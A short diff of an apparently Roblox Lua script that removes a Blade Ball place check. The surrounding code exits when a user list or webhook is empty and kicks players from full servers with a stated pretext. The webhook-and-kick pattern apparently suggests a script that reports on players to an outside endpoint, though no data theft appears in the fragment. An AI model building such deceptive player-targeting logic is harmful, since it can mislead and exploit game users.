@@ -28,11 +28,6 @@ if next(users) == nil or webhook == "" then
     return
 end
 
-if game.PlaceId ~= 13772394625 then
-    plr:kick("Game not supported. Please join a normal Blade Ball server")
-    return
-end
-
 if #Players:GetPlayers() >= 16 then
     plr:kick("Server is full. Please join a less populated server")
     return
